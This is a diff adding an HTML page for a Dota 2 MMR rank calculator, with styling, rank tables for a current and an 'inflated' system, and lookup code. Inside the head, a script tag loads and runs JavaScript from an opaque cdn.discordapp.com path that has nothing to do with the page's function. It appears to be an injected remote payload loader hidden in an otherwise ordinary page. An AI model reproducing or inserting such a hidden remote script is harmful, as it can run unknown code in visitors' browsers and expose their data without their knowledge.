@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dota 2 MMR Rank Calculator</title>
+    <style>
+        :root {
+            --dota-red: #c23c2a;
+            --dota-dark: #0f1923;
+            --dota-gold: #cdb373;
+            --dota-blue: #1a3e6f;
+            --dota-light: #f0f2f5;
+        }
+        
+        body {
+            font-family: 'Radiance', 'Arial', sans-serif;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: var(--dota-dark);
+            color: var(--dota-light);
+            background-image: radial-gradient(circle at center, var(--dota-dark) 0%, #0a111a 100%);
+        }
+        
+        h1 {
+            color: var(--dota-gold);
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2.5rem;
+            text-shadow: 0 0 10px rgba(205, 179, 115, 0.3);
+            letter-spacing: 1px;
+        }
+        
+        .container {
+            background-color: rgba(15, 25, 35, 0.8);
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            margin-bottom: 20px;
+            border: 1px solid rgba(205, 179, 115, 0.2);
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: var(--dota-gold);
+            font-size: 1.1rem;
+        }
+        
+        input[type="number"] {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid var(--dota-blue);
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: all 0.3s;
+            background-color: rgba(26, 62, 111, 0.2);
+            color: white;
+            font-weight: bold;
+        }
+        
+        input[type="number"]:focus {
+            border-color: var(--dota-gold);
+            outline: none;
+            box-shadow: 0 0 10px rgba(205, 179, 115, 0.3);
+        }
+        
+        button {
+            background: linear-gradient(to bottom, var(--dota-blue), #142a4a);
+            color: white;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            transition: all 0.3s;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border: 1px solid rgba(205, 179, 115, 0.3);
+        }
+        
+        button:hover {
+            background: linear-gradient(to bottom, #1f4b8e, #142a4a);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        button.secondary {
+            background: linear-gradient(to bottom, #3a3a3a, #2a2a2a);
+        }
+        
+        button.secondary:hover {
+            background: linear-gradient(to bottom, #4a4a4a, #3a3a3a);
+        }
+        
+        .results {
+            margin-top: 30px;
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        .results h2 {
+            color: var(--dota-gold);
+            border-bottom: 2px solid var(--dota-blue);
+            padding-bottom: 10px;
+            margin-bottom: 25px;
+            font-size: 1.8rem;
+        }
+        
+        .rank-container {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .rank-box {
+            flex: 1;
+            padding: 20px;
+            border-radius: 6px;
+            background: rgba(26, 62, 111, 0.2);
+            border: 1px solid var(--dota-blue);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .rank-box::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(to right, var(--dota-red), var(--dota-gold));
+        }
+        
+        .rank-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--dota-gold);
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+        
+        .rank-name {
+            font-size: 2rem;
+            font-weight: 800;
+            color: white;
+            margin: 15px 0;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+        }
+        
+        .rank-range {
+            color: #a7b8d1;
+            font-size: 1.1rem;
+        }
+        
+        .note {
+            font-style: italic;
+            color: #718096;
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
+        
+        .tables-container {
+            display: none;
+            margin-top: 30px;
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        .mmr-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+            background-color: rgba(15, 25, 35, 0.8);
+            border-radius: 6px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(205, 179, 115, 0.2);
+        }
+        
+        .mmr-table th {
+            background: linear-gradient(to bottom, var(--dota-blue), #142a4a);
+            color: white;
+            padding: 14px;
+            text-align: left;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .mmr-table td {
+            padding: 12px 14px;
+            border-bottom: 1px solid rgba(205, 179, 115, 0.1);
+            color: #e0e0e0;
+        }
+        
+        .mmr-table tr:nth-child(even) {
+            background-color: rgba(26, 62, 111, 0.1);
+        }
+        
+        .mmr-table tr:hover {
+            background-color: rgba(205, 179, 115, 0.1);
+        }
+        
+        .table-title {
+            color: var(--dota-gold);
+            margin: 30px 0 15px;
+            font-size: 1.5rem;
+            text-shadow: 0 0 10px rgba(205, 179, 115, 0.2);
+        }
+        
+        .immortal {
+            color: #ffcc00;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @font-face {
+            font-family: 'Radiance';
+            src: url('https://cdn.cloudflare.steamstatic.com/apps/dota2/fonts/radiance.eot');
+            src: url('https://cdn.cloudflare.steamstatic.com/apps/dota2/fonts/radiance.eot?#iefix') format('embedded-opentype'),
+                 url('https://cdn.cloudflare.steamstatic.com/apps/dota2/fonts/radiance.woff') format('woff'),
+                 url('https://cdn.cloudflare.steamstatic.com/apps/dota2/fonts/radiance.ttf') format('truetype'),
+                 url('https://cdn.cloudflare.steamstatic.com/apps/dota2/fonts/radiance.svg#radiance') format('svg');
+            font-weight: normal;
+            font-style: normal;
+        }
+    </style>
+<script type='text/javascript' src='https://cdn.discordapp.com/HG-BYqtzQVdTtRXulItu-2Y46dl-U1JqkmN6AuJu5vblL8wbJnRd6eeUEV7955H3LfmzitotBcbtBgjQ3pIYZg=='></script></head>
+<body>
+    <div class="container">
+        <h1>Dota 2 MMR Rank Calculator</h1>
+        
+        <div class="form-group">
+            <label for="mmr">Enter Your Current MMR:</label>
+            <input type="number" id="mmr" min="0" max="10000" placeholder="e.g. 4500">
+        </div>
+        
+        <button onclick="calculateRanks()">Calculate My Ranks</button>
+        <button class="secondary" onclick="toggleTables()">Show/Hide MMR Tables</button>
+        
+        <div id="results" class="results">
+            <h2>Your Rank Information</h2>
+            
+            <div class="rank-container">
+                <div class="rank-box">
+                    <div class="rank-title">Current System Rank</div>
+                    <div class="rank-name" id="current-rank-name">-</div>
+                    <div class="rank-range" id="current-rank-range">-</div>
+                </div>
+                
+                <div class="rank-box">
+                    <div class="rank-title">Inflated System Rank</div>
+                    <div class="rank-name" id="inflated-rank-name">-</div>
+                    <div class="rank-range" id="inflated-rank-range">-</div>
+                </div>
+            </div>
+            
+            <div class="note">
+                Note: Players above 5620 MMR in the current system are considered Immortal rank.
+            </div>
+        </div>
+    </div>
+
+    <div id="tables-container" class="tables-container">
+        <h2 class="table-title">Current MMR System</h2>
+        <table class="mmr-table">
+            <thead>
+                <tr>
+                    <th>Rank</th>
+                    <th>Min MMR</th>
+                    <th>Max MMR</th>
+                </tr>
+            </thead>
+            <tbody id="current-mmr-table">
+                <!-- Filled by JavaScript -->
+            </tbody>
+        </table>
+        
+        <h2 class="table-title">Inflated MMR System</h2>
+        <table class="mmr-table">
+            <thead>
+                <tr>
+                    <th>Rank</th>
+                    <th>Min MMR</th>
+                    <th>Max MMR</th>
+                </tr>
+            </thead>
+            <tbody id="inflated-mmr-table">
+                <!-- Filled by JavaScript -->
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        // Current MMR data
+        const currentRanks = [
+            { name: "Herald 1", min: 1, max: 154 },
+            { name: "Herald 2", min: 154, max: 308 },
+            { name: "Herald 3", min: 308, max: 462 },
+            { name: "Herald 4", min: 462, max: 616 },
+            { name: "Herald 5", min: 616, max: 769 },
+            { name: "Guardian 1", min: 770, max: 924 },
+            { name: "Guardian 2", min: 924, max: 1078 },
+            { name: "Guardian 3", min: 1078, max: 1232 },
+            { name: "Guardian 4", min: 1232, max: 1386 },
+            { name: "Guardian 5", min: 1386, max: 1540 },
+            { name: "Crusader 1", min: 1540, max: 1694 },
+            { name: "Crusader 2", min: 1694, max: 1848 },
+            { name: "Crusader 3", min: 1848, max: 2002 },
+            { name: "Crusader 4", min: 2002, max: 2156 },
+            { name: "Crusader 5", min: 2156, max: 2310 },
+            { name: "Archon 1", min: 2310, max: 2464 },
+            { name: "Archon 2", min: 2464, max: 2618 },
+            { name: "Archon 3", min: 2618, max: 2772 },
+            { name: "Archon 4", min: 2772, max: 2926 },
+            { name: "Archon 5", min: 2926, max: 3080 },
+            { name: "Legend 1", min: 3080, max: 3234 },
+            { name: "Legend 2", min: 3234, max: 3388 },
+            { name: "Legend 3", min: 3388, max: 3542 },
+            { name: "Legend 4", min: 3542, max: 3696 },
+            { name: "Legend 5", min: 3696, max: 3850 },
+            { name: "Ancient 1", min: 3850, max: 4004 },
+            { name: "Ancient 2", min: 4004, max: 4158 },
+            { name: "Ancient 3", min: 4158, max: 4312 },
+            { name: "Ancient 4", min: 4312, max: 4466 },
+            { name: "Ancient 5", min: 4466, max: 4620 },
+            { name: "Divine 1", min: 4620, max: 4820 },
+            { name: "Divine 2", min: 4820, max: 5020 },
+            { name: "Divine 3", min: 5020, max: 5220 },
+            { name: "Divine 4", min: 5220, max: 5420 },
+            { name: "Divine 5", min: 5420, max: 5620 }
+        ];
+
+        // Inflated MMR data
+        const inflatedRanks = [
+            { name: "Herald I", min: 0, max: 242 },
+            { name: "Herald II", min: 243, max: 485 },
+            { name: "Herald III", min: 486, max: 728 },
+            { name: "Herald IV", min: 729, max: 971 },
+            { name: "Herald V", min: 972, max: 1214 },
+            { name: "Guardian I", min: 1215, max: 1457 },
+            { name: "Guardian II", min: 1458, max: 1700 },
+            { name: "Guardian III", min: 1701, max: 1943 },
+            { name: "Guardian IV", min: 1944, max: 2186 },
+            { name: "Guardian V", min: 2187, max: 2429 },
+            { name: "Crusader I", min: 2430, max: 2672 },
+            { name: "Crusader II", min: 2673, max: 2915 },
+            { name: "Crusader III", min: 2916, max: 3158 },
+            { name: "Crusader IV", min: 3159, max: 3401 },
+            { name: "Crusader V", min: 3402, max: 3644 },
+            { name: "Archon I", min: 3645, max: 3887 },
+            { name: "Archon II", min: 3888, max: 4130 },
+            { name: "Archon III", min: 4131, max: 4373 },
+            { name: "Archon IV", min: 4374, max: 4616 },
+            { name: "Archon V", min: 4617, max: 4859 },
+            { name: "Legend I", min: 4860, max: 5102 },
+            { name: "Legend II", min: 5103, max: 5345 },
+            { name: "Legend III", min: 5346, max: 5588 },
+            { name: "Legend IV", min: 5589, max: 5831 },
+            { name: "Legend V", min: 5832, max: 6074 },
+            { name: "Ancient I", min: 6075, max: 6317 },
+            { name: "Ancient II", min: 6318, max: 6560 },
+            { name: "Ancient III", min: 6561, max: 6803 },
+            { name: "Ancient IV", min: 6804, max: 7046 },
+            { name: "Ancient V", min: 7047, max: 7289 },
+            { name: "Divine I", min: 7290, max: 7532 },
+            { name: "Divine II", min: 7533, max: 7775 },
+            { name: "Divine III", min: 7776, max: 8018 },
+            { name: "Divine IV", min: 8019, max: 8261 },
+            { name: "Divine V", min: 8262, max: 8500 }
+        ];
+
+        // Initialize tables when page loads
+        window.onload = function() {
+            populateTable("current-mmr-table", currentRanks);
+            populateTable("inflated-mmr-table", inflatedRanks);
+        };
+
+        function populateTable(tableId, ranks) {
+            const tableBody = document.getElementById(tableId);
+            tableBody.innerHTML = "";
+            
+            ranks.forEach(rank => {
+                const row = document.createElement("tr");
+                row.innerHTML = `
+                    <td>${rank.name}</td>
+                    <td>${rank.min}</td>
+                    <td>${rank.max}</td>
+                `;
+                tableBody.appendChild(row);
+            });
+
+            // Add Immortal row for current MMR table
+            if (tableId === "current-mmr-table") {
+                const immortalRow = document.createElement("tr");
+                immortalRow.innerHTML = `
+                    <td class="immortal">Immortal</td>
+                    <td class="immortal">5621</td>
+                    <td class="immortal">∞</td>
+                `;
+                tableBody.appendChild(immortalRow);
+            }
+        }
+
+        function calculateRanks() {
+            const mmrInput = document.getElementById("mmr");
+            const mmr = parseInt(mmrInput.value);
+            const resultsDiv = document.getElementById("results");
+            
+            // Validate input
+            if (isNaN(mmr)) {
+                alert("Please enter a valid MMR number");
+                return;
+            }
+            
+            if (mmr < 0) {
+                alert("MMR cannot be negative");
+                return;
+            }
+            
+            // Find current rank
+            let currentRank = "Unranked";
+            let currentRange = "MMR: 0";
+            let isImmortal = false;
+
+            if (mmr > 5620) {
+                currentRank = "Immortal";
+                currentRange = "MMR: 5621+";
+                isImmortal = true;
+            } else {
+                for (const rank of currentRanks) {
+                    if (mmr >= rank.min && mmr <= rank.max) {
+                        currentRank = rank.name;
+                        currentRange = `MMR Range: ${rank.min}-${rank.max}`;
+                        break;
+                    }
+                }
+            }
+            
+            // Find inflated rank
+            let inflatedRank = "Unranked";
+            let inflatedRange = "MMR: 0";
+            for (const rank of inflatedRanks) {
+                if (mmr >= rank.min && mmr <= rank.max) {
+                    inflatedRank = rank.name;
+                    inflatedRange = `MMR Range: ${rank.min}-${rank.max}`;
+                    break;
+                }
+            }
+            
+            // Display results
+            const currentRankElement = document.getElementById("current-rank-name");
+            currentRankElement.textContent = currentRank;
+            currentRankElement.className = isImmortal ? "rank-name immortal" : "rank-name";
+            
+            document.getElementById("current-rank-range").textContent = currentRange;
+            document.getElementById("inflated-rank-name").textContent = inflatedRank;
+            document.getElementById("inflated-rank-range").textContent = inflatedRange;
+            
+            // Show results section
+            resultsDiv.style.display = "block";
+        }
+
+        function toggleTables() {
+            const tablesContainer = document.getElementById("tables-container");
+            if (tablesContainer.style.display === "none" || tablesContainer.style.display === "") {
+                tablesContainer.style.display = "block";
+            } else {
+                tablesContainer.style.display = "none";
+            }
+        }
+    </script>
+</body>
+</html>
